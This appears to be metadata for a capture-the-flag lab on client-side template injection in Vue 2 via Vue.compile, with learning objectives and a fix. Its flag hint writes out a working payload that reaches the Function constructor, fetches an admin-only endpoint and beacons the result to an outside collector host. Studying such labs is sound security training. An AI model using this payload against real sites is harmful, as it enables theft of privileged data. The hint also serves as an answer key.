title: Vue 2 Runtime Template Compilation Injection (Vue.compile)
learning_objectives: Recognise client-side template injection (CSTI): user input compiled as a framework template, not just rendered as text
Understand that Vue.compile()/runtime compilation of untrusted input evaluates its expressions in the component scope
Reach the Function constructor from a Vue expression via constructor.constructor
Chain the CSTI to a same-origin fetch of an admin-only API the payload could not reach directly
See that the fix is to never compile user templates — use the runtime-only build and render user data as text
flag_hint: POST /widget {"template":"{{ constructor.constructor(\"fetch('/me').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?m='+encodeURIComponent(t)})\")() }}"}; the admin bot's dashboard Vue.compile()s it, fetching the admin-only /me. Read it via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
tech_stack: Vue 2.7.16 (vendored full build; runtime Vue.compile of user input)
inspired_by: The Nuxt/Vue runtime-template-compilation CSTI class, re-platformed to Flask + a vendored standalone Vue 2.7 (the Vue.compile-of-user-input sink is framework-version-independent)
